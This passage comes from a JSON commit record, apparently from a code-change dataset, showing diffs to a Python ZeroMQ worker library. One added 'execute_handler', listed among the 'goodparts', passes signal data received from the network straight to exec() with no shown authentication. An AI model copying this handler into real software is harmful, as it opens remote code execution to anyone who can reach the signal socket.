return(b'Router', b'auth-bind-route', args, reqid) def make_auth_unbind_route_data(self, interface, method, key, reqid=None): if not reqid: reqid=self.make_reqid() args=[interface, method, make_auth_hash(interface, method, reqid, key)] return(b'Router', b'auth-unbind-route', args, reqid) def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None): if not reqid: reqid=self.make_reqid() args=[interface, method, struct.pack('!B', type_), make_auth_hash(interface, method, reqid, key)] return(b'Router', b'auth-set-route-type', args, reqid) def make_auth_clear_data(self, reqid=None): if not reqid: reqid=self.make_reqid() return(b'Router', b'auth-clear',[], reqid) def req_from_data(self, d, fun): return self.make_req_msg(d[0], d[1], d[2], fun, d[3]) def _parse_err(self, iden, msg, status): pass def _handle_nil(self, iden, msg): pass ", "sourceWithComments": "# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom . import *\nfrom .wzbase import WZBase\n\nclass WZHandler(WZBase):\n    def __init__(self):\n        self.req_handlers = {}\n        self.response_handlers = {}\n        self.sig_handlers = {}\n        self.iden_reqid_map = BijectiveSetMap()\n\n    def set_req_handler(self, interface, method, fun):\n        self.req_handlers[(interface, method)] = fun\n\n    def set_response_handler(self, reqid, fun):\n        self.response_handlers[reqid] = fun\n\n    def set_sig_handler(self, interface, method, fun):\n        self.sig_handlers[(interface, method)] = fun\n    \n    def del_req_handler(self, interface, method):\n        del self.req_handlers[(interface, method)]\n\n    def del_response_handler(self, reqid):\n        del self.response_handlers[reqid]\n\n    def del_sig_handler(self, interface, method):\n        del self.sig_handlers[(interface, method)]\n\n    def _parse_req(self, iden, msg, reqid, interface, method):\n        try:\n            handler = self.req_handlers[(interface, method)]\n        except KeyError:\n            try:\n                handler = self.req_handlers[(interface, None)]\n            except KeyError:\n                raise WZENoReqHandler(iden, reqid,\n                    'No req handler for %s,%s'%(interface, method))\n        if iden:\n            self.iden_reqid_map.add_value(tuple(iden), reqid)\n        handler(reqid, interface, method, msg[1:])\n        return ()\n\n    def _parse_rep(self, iden, msg, reqid, seqnum, status):\n        try:\n            handler = self.response_handlers[reqid]\n            if seqnum == 0:\n                del self.response_handlers[reqid]\n        except KeyError:\n            raise WZENoHandler(iden, 'No rep handler for reqid')\n        handler(reqid, seqnum, status, msg[1:])\n        return ()\n\n    def _parse_sig(self, iden, msg, interface, method):\n        try:\n            handler = self.sig_handlers[(interface, method)]\n        except KeyError:\n            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))\n        handler(interface, method, msg[1:])\n        return ()\n\n    def make_req_msg(self, interface, method, args, fun, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        msg = make_req_msg(interface, method, args, reqid)\n        self.set_response_handler(reqid, fun)\n        return msg\n    \n    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):\n        msg = iden[:]\n        msg.append(b'')\n        msg.extend(self.make_req_msg(interface, method, args, fun, reqid))\n        return msg\n    \n    def make_router_rep_msg(self, reqid, seqnum, status, answer):\n        iden = self.iden_reqid_map.get_key(reqid)\n        if seqnum == 0:\n            self.iden_reqid_map.del_value(iden, reqid)\n        msg = list(iden)\n        msg.append(b'')\n        msg.extend(make_rep_msg(reqid, seqnum, status, answer))\n        return msg\n\n    def get_iden(self, reqid):\n        return self.iden_reqid_map.get_key(reqid)\n\n    def get_reqids(self, iden):\n        return self.iden_reqid_map.get_values(iden)\n\n    def make_reqid(self):\n        while True:\n            reqid = random.randint(1, (2**64)-1)\n            if not reqid in self.response_handlers:\n                return reqid\n        \n    def make_auth_req_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-request', args, reqid)\n\n    def make_auth_bind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n        return (b'Router', b'auth-bind-route', args, reqid)\n\n    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n        return (b'Router', b'auth-unbind-route', args, reqid)\n\n    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, struct.pack('!B', type_),\n                make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-set-route-type', args, reqid)\n\n    def make_auth_clear_data(self, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        return (b'Router', b'auth-clear', [], reqid)\n\n    def req_from_data(self, d, fun):\n        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])\n  \n    def _parse_err(self, iden, msg, status):\n        pass\n\n    def _handle_nil(self, iden, msg):\n        pass\n"}, "/lib/wzworkers.py": {"changes": [{"diff": "\n         self.wz_addr = wz_addr\n         self.wz_auth_requests = []\n         self.wz_bind_methods = []\n-        self.wz_poll_timeout = 30\n+        self.wz_poll_timeout = 30 * 1000\n+        self.wz_retry_timeout = 5\n \n     def __sinit__(self):\n         '''Initializes thread-local interface on startup'''\n", "add": 2, "remove": 1, "filename": "/lib/wzworkers.py", "badparts": ["        self.wz_poll_timeout = 30"], "goodparts": ["        self.wz_poll_timeout = 30 * 1000", "        self.wz_retry_timeout = 5"]}, {"diff": "\n \n         self.wz = WZHandler()\n \n-        def term_handler(interface, method, data):\n+        def term_handler(i, m, d):\n             self.log.info(\n                 'Termination signal %s recieved',\n-                repr((interface, method, data)))\n+                repr((i, m, d)))\n             self.term()\n             raise WorkerInterrupt()\n         self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)\n \n-        def resumehandler(interface, method, data):\n-            self.log.info('Resume signal %s recieved',\n-                repr((interface, method, data)))\n+        def execute_handler(i, m, d):\n+            if len(d) < 1:\n+                return\n+            try:\n+                exec(d[0].decode('utf-8'))\n+            except Exception as e:\n+                self.log.exception(e)\n+        self.wz.set_sig_handler(b'WZWorker', b'execute', execute_handler)\n+\n+        def suspend_handler(i, m, d):\n+            if len(d) != 1:\n+                self.log.waring('Suspend signal without a time recieved, ignoring')\n+            self.log.info('Suspend signal %s recieved', repr((i, m, d)))\n+            try:\n+                t = int(d[0])\n+                # raise Suspend(t)\n+                self.inter_sleep(t)\n+            except Resume as e:\n+                self.log.info(e)\n+            except Exception as e:\n+                self.log.error(e)\n+        self.wz.set_sig_handler(b'WZWorker', b'suspend', suspend_handler)\n+\n+        def resume_handler(i, m, d):\n+            self.log.info('Resume signal %s recieved', repr((i, m, d)))\n             raise Resume()\n+        self.wz.set_sig_handler(b'WZWorker', b'resume', resume_handler)\n \n-        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)\n         self.running.set()\n \n     def wz_connect(self):\n         self.wz_sock.connect(self.wz_addr)\n \n     def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n-        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n+        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n         timeout = timeout if timeout else self.wz_poll_timeout\n         rs = wzrpc.RequestState(fun)\n         msg = self.wz.make_req_msg(interface, method, data,\n", "add": 29, "remove": 7, "filename": "/lib/wzworkers.py", "badparts": ["        def term_handler(interface, method, data):", "                repr((interface, method, data)))", "        def resumehandler(interface, method, data):", "            self.log.info('Resume signal %s recieved',", "                repr((interface, method, data)))", "        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)", "        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz"], "goodparts": ["        def term_handler(i, m, d):", "                repr((i, m, d)))", "        def execute_handler(i, m, d):", "            if len(d) < 1:", "                return", "            try:", "                exec(d[0].decode('utf-8'))", "            except Exception as e:", "                self.log.exception(e)", "        self.wz.set_sig_handler(b'WZWorker', b'execute', execute_handler)", "        def suspend_handler(i, m, d):", "            if len(d) != 1:", "                self.log.waring('Suspend signal without a time recieved, ignoring')", "            self.log.info('Suspend signal %s recieved', repr((i, m, d)))", "            try:", "                t = int(d[0])", "                self.inter_sleep(t)", "            except Resume as e:", "                self.log.info(e)", "            except Exception as e:", "                self.log.error(e)", "        self.wz.set_sig_handler(b'WZWorker', b'suspend', suspend_handler)", "        def resume_handler(i, m, d):", "            self.log.info('Resume signal %s recieved', repr((i, m, d)))", "        self.wz.set_sig_handler(b'WZWorker', b'resume', resume_handler)", "        s, p, t = self.wz_sock, self.poll, self.sleep_ticker"]}, {"diff": "\n                 rs.accept(None, 0, 255, [elapsed])\n                 # fun sets rs.retry = True if it wants to retry\n         raise WorkerInterrupt()\n-    \n+\n     def wz_multiwait(self, requests):\n         # TODO: rewrite the retry loop\n-        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n+        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n         timeout = self.wz_poll_timeout\n         rslist = []\n         msgdict = {}\n", "add": 2, "remove": 2, "filename": "/lib/wzworkers.py", "badparts": ["        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz"], "goodparts": ["        s, p, t = self.wz_sock, self.poll, self.sleep_ticker"]}, {"diff": "\n                 if status == wzrpc.status.success:\n                     self.log.debug('Successfull auth for (%s, %s)', i, m)\n                 elif status == wzrpc.status.e_auth_wrong_hash:\n-                    raise beon.PermanentError(\n+                    raise exceptions.PermanentError(\n                         'Cannot authentificate for ({0}, {1}), {2}: {3}'.\\\n                         format(i, m, wzrpc.name_status(status), repr(data)))\n                 elif wzrpc.status.e_timeout:\n", "add": 1, "remove": 1, "filename": "/lib/wzworkers.py", "badparts": ["                    raise beon.PermanentError("], "goodparts": ["                    raise exceptions.PermanentError("]}, {"diff": "\n         for i, m, f, t in self.wz_bind_methods:\n             self.set_route_type(i, m, t)\n             self.bind_route(i, m, f)\n-    \n-    def unbind_methods(self):  \n+\n+    def unbind_methods(self):\n         for i, m, f, t in self.wz_bind_methods:\n             self.unbind_route(i, m)\n-        #self.clear_auth()\n+        # self.clear_auth()\n \n     def send_rep(self, reqid, seqnum, status, data):\n         self.wz_sock.send_multipart(\n", "add": 3, "remove": 3, "filename": "/lib/wzworkers.py", "badparts": ["    def unbind_methods(self):  "], "goodparts": ["    def unbind_methods(self):"]}, {"diff": "\n \n     def inter_sleep(self, timeout):\n         self.sleep_ticker.tick()\n-        self.poll(timeout * 1000)\n         while self.sleep_ticker.elapsed(False) < timeout:\n             try:\n                 self.poll(timeout * 1000)\n-            except Resume as e:\n+            except Resume:\n                 return\n \n     def poll(self, timeout=None):\n         try:\n-            socks = dict(self.poller.poll(timeout if timeout != None\n+            socks = dict(self.poller.poll(timeout if timeout is not None\n                 else self.poll_timeout))\n         except zmq.ZMQError as e:\n             self.log.error(e)\n", "add": 2, "remove": 3, "filename": "/lib/wzworkers.py", "badparts": ["        self.poll(timeout * 1000)", "            except Resume as e:", "            socks = dict(self.poller.poll(timeout if timeout != None"], "goodparts": ["            except Resume:", "            socks = dict(self.poller.poll(timeout if timeout is not None"]}], "source": "\nimport zmq import threading, multiprocessing import logging from sup.ticker import Ticker import wzrpc from wzrpc.wzhandler import WZHandler import wzauth_data class WorkerInterrupt(Exception): '''Exception to raise when self.running is cleared''' def __init__(self): super().__init__('Worker was interrupted at runtime') class Suspend(Exception): '''Exception to raise on suspend signal''' def __init__(self, interval, *args, **kvargs): self.interval=interval super().__init__(*args, **kvargs) class Resume(Exception): '''Exception to raise when suspend sleep is interrupted''' class WZWorkerBase: def __init__(self, wz_addr, fun, args=(), kvargs={}, name=None, start_timer=None, poll_timeout=None, pargs=(), pkvargs={}): super().__init__(*pargs, **pkvargs) self.name=name if name else type(self).__name__ self.start_timer=start_timer self.poll_timeout=poll_timeout if poll_timeout else 5*1000 self.call=(fun, args, kvargs) self.wz_addr=wz_addr self.wz_auth_requests=[] self.wz_bind_methods=[] self.wz_poll_timeout=30 def __sinit__(self): '''Initializes thread-local interface on startup''' self.log=logging.getLogger(self.name) self.running=threading.Event() self.sleep_ticker=Ticker() self.poller=zmq.Poller() s=self.ctx.socket(zmq.SUB) self.poller.register(s, zmq.POLLIN) s.setsockopt(zmq.IPV6, True) s.connect(self.sig_addr) s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL') s.setsockopt(zmq.SUBSCRIBE, b'WZWorker') s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8')) self.sig_sock=s s=self.ctx.socket(zmq.DEALER) self.poller.register(s, zmq.POLLIN) s.setsockopt(zmq.IPV6, True) self.wz_sock=s self.wz=WZHandler() def term_handler(interface, method, data): self.log.info( 'Termination signal %s recieved', repr((interface, method, data))) self.term() raise WorkerInterrupt() self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler) def resumehandler(interface, method, data): self.log.info('Resume signal %s recieved', repr((interface, method, data))) raise Resume() self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler) self.running.set() def wz_connect(self): self.wz_sock.connect(self.wz_addr) def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None): s, p, t, wz=self.wz_sock, self.poll, self.sleep_ticker, self.wz timeout=timeout if timeout else self.wz_poll_timeout rs=wzrpc.RequestState(fun) msg=self.wz.make_req_msg(interface, method, data, rs.accept, reqid) msg.insert(0, b'') s.send_multipart(msg) t.tick() while self.running.is_set(): p(timeout*1000) if rs.finished: if rs.retry: msg=self.wz.make_req_msg(interface, method, data, rs.accept, reqid) msg.insert(0, b'') s.send_multipart(msg) rs.finished=False rs.retry=False continue return elapsed=t.elapsed(False) if elapsed >=timeout: t.tick() rs.accept(None, 0, 255,[elapsed]) raise WorkerInterrupt() def wz_multiwait(self, requests): s, p, t, wz=self.wz_sock, self.poll, self.sleep_ticker, self.wz timeout=self.wz_poll_timeout rslist=[] msgdict={} for request in requests: rs=wzrpc.RequestState(request[0]) rslist.append(rs) msg=self.wz.make_req_msg(request[1][0], request[1][1], request[1][2], rs.accept, request[1][3]) msg.insert(0, b'') msgdict[rs]=msg s.send_multipart(msg) while self.running.is_set(): flag=0 for rs in rslist: if rs.finished: if not rs.retry: del msgdict[rs] continue s.send_multipart(msgdict[rs]) rs.finished=False rs.retry=False flag=1 if not flag: return t.tick() p(timeout*1000) if t.elapsed(False) >=timeout: for rs in rslist: if not rs.finished: rs.accept(None, 0, 255,[]) rs.finished=True raise WorkerInterrupt() def auth_requests(self): for i, m in self.wz_auth_requests: def accept(that, reqid, seqnum, status, data): if status==wzrpc.status.success: self.log.debug('Successfull auth for(%s, %s)', i, m) elif status==wzrpc.status.e_auth_wrong_hash: raise beon.PermanentError( 'Cannot authentificate for({0},{1}),{2}:{3}'.\\ format(i, m, wzrpc.name_status(status), repr(data))) elif wzrpc.status.e_timeout: self.log.warn('Timeout{0}, retrying'.format(data[0])) that.retry=True else: self.log.warning('Recvd unknown reply for(%s, %s) %s: %s', i, m, wzrpc.name_status(status), repr(data)) self.wz_wait_reply(accept, *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m])) def bind_route(self, i, m, f): self.log.debug('Binding %s,%s route', i, m) def accept(that, reqid, seqnum, status, data): if status==wzrpc.status.success: self.wz.set_req_handler(i, m, f) self.log.debug('Succesfully binded route(%s, %s)', i, m) elif status==wzrpc.status.e_req_denied: self.log.warn('Status{0}, reauthentificating'.\\ format(wzrpc.name_status(status))) self.auth_requests() elif wzrpc.status.e_timeout: self.log.warn('Timeout{0}, retrying'.format(data[0])) that.retry=True else: self.log.warn('Status{0}, retrying'.format(wzrpc.name_status(status))) that.retry=True return self.wz_wait_reply(accept, *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m])) def set_route_type(self, i, m, t): self.log.debug('Setting %s,%s type to %d', i, m, t) def accept(that, reqid, seqnum, status, data): if status==wzrpc.status.success: self.log.debug('Succesfully set route type for(%s, %s) to %s', i, m, wzrpc.name_route_type(t)) elif status==wzrpc.status.e_req_denied: self.log.warn('Status{0}, reauthentificating'.\\ format(wzrpc.name_status(status))) self.auth_requests() else: self.log.warn('Status{0}, retrying'.format(wzrpc.name_status(status))) that.retry=True return self.wz_wait_reply(accept, *self.wz.make_auth_set_route_type_data(i, m, t, wzauth_data.set_route_type[i, m])) def unbind_route(self, i, m): if not(i, m) in self.wz.req_handlers: self.log.debug('Route %s,%s was not bound', i, m) return self.log.debug('Unbinding route %s,%s', i, m) self.wz.del_req_handler(i, m) def accept(that, reqid, seqnum, status, data): if status==wzrpc.status.success: self.log.debug('Route unbinded for(%s, %s)', i, m) else: self.log.warn('Status %s, passing', wzrpc.name_status(status)) return self.wz_wait_reply(accept, *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m])) def clear_auth(self): self.log.debug('Clearing our auth records') def accept(that, reqid, seqnum, status, data): if status==wzrpc.status.success: self.log.debug('Auth records on router were cleared') else: self.log.warn('Status %s, passing', wzrpc.name_status(status)) return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data()) def bind_methods(self): for i, m, f, t in self.wz_bind_methods: self.set_route_type(i, m, t) self.bind_route(i, m, f) def unbind_methods(self): for i, m, f, t in self.wz_bind_methods: self.unbind_route(i, m) def send_rep(self, reqid, seqnum, status, data): self.wz_sock.send_multipart( self.wz.make_router_rep_msg(reqid, seqnum, status, data)) def send_success_rep(self, reqid, data): self.send_rep(reqid, 0, wzrpc.status.success, data) def send_error_rep(self, reqid, data): self.send_rep(reqid, 0, wzrpc.status.error, data) def send_wz_error(self, reqid, data, seqid=0): msg=self.wz.make_dealer_rep_msg( reqid, seqid, wzrpc.status.error, data) self.wz_sock.send_multipart(msg) def send_to_router(self, msg): msg.insert(0, b'') self.wz_sock.send_multipart(msg) def inter_sleep(self, timeout): self.sleep_ticker.tick() self.poll(timeout * 1000) while self.sleep_ticker.elapsed(False) < timeout: try: self.poll(timeout * 1000) except Resume as e: return def poll(self, timeout=None): try: socks=dict(self.poller.poll(timeout if timeout !=None else self.poll_timeout)) except zmq.ZMQError as e: self.log.error(e) return if socks.get(self.sig_sock)==zmq.POLLIN: frames=self.sig_sock.recv_multipart() try: self.wz.parse_msg(frames[0], frames[1:]) except wzrpc.WZError as e: self.log.warn(e) if socks.get(self.wz_sock)==zmq.POLLIN: self.process_wz_msg(self.wz_sock.recv_multipart()) return socks def process_wz_msg(self, frames): try: for nfr in self.wz.parse_router_msg(frames): self.wz_sock.send_multipart(nfr) except wzrpc.WZErrorRep as e: self.log.info(e) self.wz_sock.send_multipart(e.rep_msg) except wzrpc.WZError as e: self.log.warn(e) def run(self): self.__sinit__() if self.start_timer: self.inter_sleep(self.start_timer) if self.running: self.log.info('Starting') try: self.child=self.call[0](*self.call[1], **self.call[2]) self.child(self) except WorkerInterrupt as e: self.log.warn(e) except Exception as e: self.log.exception(e) self.log.info('Terminating') else: self.log.info('Aborted') self.running.set() self.unbind_methods() self.running.clear() self.wz_sock.close() self.sig_sock.close() def term(self): self.running.clear() class WZWorkerThread(WZWorkerBase, threading.Thread): def start(self, ctx, sig_addr, *args, **kvargs): self.ctx=ctx self.sig_addr=sig_addr threading.Thread.start(self, *args, **kvargs) class WZWorkerProcess(WZWorkerBase, multiprocessing.Process): def start(self, sig_addr, *args, **kvargs): self.sig_addr=sig_addr multiprocessing.Process.start(self, *args, **kvargs) def __sinit__(self): self.ctx=zmq.Context() super().__sinit__() ", "sourceWithComments": "import zmq\nimport threading, multiprocessing\nimport logging\nfrom sup.ticker import Ticker\n# from sup import split_frames\nimport wzrpc\nfrom wzrpc.wzhandler import WZHandler\nimport wzauth_data\n\nclass WorkerInterrupt(Exception):\n    '''Exception to raise when self.running is cleared'''\n    def __init__(self):\n        super().__init__('Worker was interrupted at runtime')\n\nclass Suspend(Exception):\n    # if we need this at all.\n    '''Exception to raise on suspend signal'''\n    def __init__(self, interval, *args, **kvargs):\n        self.interval = interval\n        super().__init__(*args, **kvargs)\n\nclass Resume(Exception):\n    '''Exception to raise when suspend sleep is interrupted'''\n\nclass WZWorkerBase:\n    def __init__(self, wz_addr, fun, args=(), kvargs={},\n            name=None, start_timer=None, poll_timeout=None,\n            pargs=(), pkvargs={}):\n        super().__init__(*pargs, **pkvargs)\n        self.name = name if name else type(self).__name__\n        self.start_timer = start_timer\n        self.poll_timeout = poll_timeout if poll_timeout else 5*1000\n        self.call = (fun, args, kvargs)\n\n        self.wz_addr = wz_addr\n        self.wz_auth_requests = []\n        self.wz_bind_methods = []\n        self.wz_poll_timeout = 30\n\n    def __sinit__(self):\n        '''Initializes thread-local interface on startup'''\n        self.log = logging.getLogger(self.name)\n        self.running = threading.Event()\n        self.sleep_ticker = Ticker()\n        self.poller = zmq.Poller()\n\n        s = self.ctx.socket(zmq.SUB)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        s.connect(self.sig_addr)\n        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')\n        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')\n        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))\n        self.sig_sock = s\n\n        s = self.ctx.socket(zmq.DEALER)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        self.wz_sock = s\n\n        self.wz = WZHandler()\n\n        def term_handler(interface, method, data):\n            self.log.info(\n                'Termination signal %s recieved',\n                repr((interface, method, data)))\n            self.term()\n            raise WorkerInterrupt()\n        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)\n\n        def resumehandler(interface, method, data):\n            self.log.info('Resume signal %s recieved',\n                repr((interface, method, data)))\n            raise Resume()\n\n        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)\n        self.running.set()\n\n    def wz_connect(self):\n        self.wz_sock.connect(self.wz_addr)\n\n    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n        timeout = timeout if timeout else self.wz_poll_timeout\n        rs = wzrpc.RequestState(fun)\n        msg = self.wz.make_req_msg(interface, method, data,\n                                   rs.accept, reqid)\n        msg.insert(0, b'')\n        s.send_multipart(msg)\n        t.tick()\n        while self.running.is_set():\n            p(timeout*1000)\n            if rs.finished:\n                if rs.retry:\n                    msg = self.wz.make_req_msg(interface, method, data,\n                        rs.accept, reqid)\n                    msg.insert(0, b'')\n                    s.send_multipart(msg)\n                    rs.finished = False\n                    rs.retry = False\n                    continue\n                return\n            elapsed = t.elapsed(False)\n            if elapsed >= timeout:\n                t.tick()\n                # Notify fun about the timeout\n                rs.accept(None, 0, 255, [elapsed])\n                # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n    \n    def wz_multiwait(self, requests):\n        # TODO: rewrite the retry loop\n        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n        timeout = self.wz_poll_timeout\n        rslist = []\n        msgdict = {}\n        for request in requests:\n            rs = wzrpc.RequestState(request[0])\n            rslist.append(rs)\n            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],\n                                    rs.accept, request[1][3])\n            msg.insert(0, b'')\n            msgdict[rs] = msg\n            s.send_multipart(msg)\n        while self.running.is_set():\n            flag = 0\n            for rs in rslist:\n                if rs.finished:\n                    if not rs.retry:\n                        del msgdict[rs]\n                        continue\n                    s.send_multipart(msgdict[rs])\n                    rs.finished = False\n                    rs.retry = False\n                flag = 1\n            if not flag:\n                return\n            # check rs before polling, since we don't want to notify finished one\n            # about the timeout\n            t.tick()\n            p(timeout*1000)\n            if t.elapsed(False) >= timeout:\n                for rs in rslist:\n                    if not rs.finished:\n                        rs.accept(None, 0, 255, []) # Notify fun about the timeout\n                        rs.finished = True # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n\n    def auth_requests(self):\n        for i, m in self.wz_auth_requests:\n            def accept(that, reqid, seqnum, status, data):\n                if status == wzrpc.status.success:\n                    self.log.debug('Successfull auth for (%s, %s)', i, m)\n                elif status == wzrpc.status.e_auth_wrong_hash:\n                    raise beon.PermanentError(\n                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\\\n                        format(i, m, wzrpc.name_status(status), repr(data)))\n                elif wzrpc.status.e_timeout:\n                    self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                    that.retry = True\n                else:\n                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,\n                        wzrpc.name_status(status), repr(data))\n            self.wz_wait_reply(accept,\n                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))\n\n\n    def bind_route(self, i, m, f):\n        self.log.debug('Binding %s,%s route', i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.wz.set_req_handler(i, m, f)\n                self.log.debug('Succesfully binded route (%s, %s)', i, m)\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            elif wzrpc.status.e_timeout:\n                self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                that.retry = True\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))\n\n    def set_route_type(self, i, m, t):\n        self.log.debug('Setting %s,%s type to %d', i, m, t)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,\n                    wzrpc.name_route_type(t))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_set_route_type_data(i, m, t,\n                wzauth_data.set_route_type[i, m]))\n\n    def unbind_route(self, i, m):\n        if not (i, m) in self.wz.req_handlers:\n            self.log.debug('Route %s,%s was not bound', i, m)\n            return\n        self.log.debug('Unbinding route %s,%s', i, m)\n        self.wz.del_req_handler(i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Route unbinded for (%s, %s)', i, m)\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))\n    \n    def clear_auth(self):\n        self.log.debug('Clearing our auth records')\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Auth records on router were cleared')\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())\n\n    def bind_methods(self):\n        for i, m, f, t in self.wz_bind_methods:\n            self.set_route_type(i, m, t)\n            self.bind_route(i, m, f)\n    \n    def unbind_methods(self):  \n        for i, m, f, t in self.wz_bind_methods:\n            self.unbind_route(i, m)\n        #self.clear_auth()\n\n    def send_rep(self, reqid, seqnum, status, data):\n        self.wz_sock.send_multipart(\n            self.wz.make_router_rep_msg(reqid, seqnum, status, data))\n\n    def send_success_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.success, data)\n    \n    def send_error_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.error, data)\n\n    def send_wz_error(self, reqid, data, seqid=0):\n        msg = self.wz.make_dealer_rep_msg(\n            reqid, seqid, wzrpc.status.error, data)\n        self.wz_sock.send_multipart(msg)\n        \n    def send_to_router(self, msg):\n        msg.insert(0, b'')\n        self.wz_sock.send_multipart(msg)\n    \n    # def bind_sig_route(self, routetype, interface, method, fun):\n    #     self.log.info('Binding %s,%s as type %d signal route',\n    #                   interface, method, routetype)\n    #     self.wz.set_signal_handler(interface, method, fun)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    # def unbind_sig_route(self, interface, method):\n    #     self.log.info('Deleting %s,%s signal route', interface, method)\n    #     self.wz.del_signal_handler(interface, method)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    def inter_sleep(self, timeout):\n        self.sleep_ticker.tick()\n        self.poll(timeout * 1000)\n        while self.sleep_ticker.elapsed(False) < timeout:\n            try:\n                self.poll(timeout * 1000)\n            except Resume as e:\n                return\n\n    def poll(self, timeout=None):\n        try:\n            socks = dict(self.poller.poll(timeout if timeout != None\n                else self.poll_timeout))\n        except zmq.ZMQError as e:\n            self.log.error(e)\n            return\n        if socks.get(self.sig_sock) == zmq.POLLIN:\n            # No special handling or same-socket replies are necessary for signals.\n            # Backwards socket replies may be added here.\n            frames = self.sig_sock.recv_multipart()\n            try:\n                self.wz.parse_msg(frames[0], frames[1:])\n            except wzrpc.WZError as e:\n                self.log.warn(e)\n        if socks.get(self.wz_sock) == zmq.POLLIN:\n            self.process_wz_msg(self.wz_sock.recv_multipart())\n        return socks\n\n    def process_wz_msg(self, frames):\n        try:\n            for nfr in self.wz.parse_router_msg(frames):\n                # Send replies from the handler, for cases when it's methods were rewritten.\n                self.wz_sock.send_multipart(nfr)\n        except wzrpc.WZErrorRep as e:\n            self.log.info(e)\n            self.wz_sock.send_multipart(e.rep_msg)\n        except wzrpc.WZError as e:\n            self.log.warn(e)\n\n    def run(self):\n        self.__sinit__()\n        if self.start_timer:\n            self.inter_sleep(self.start_timer)\n        if self.running:\n            self.log.info('Starting')\n            try:\n                self.child = self.call[0](*self.call[1], 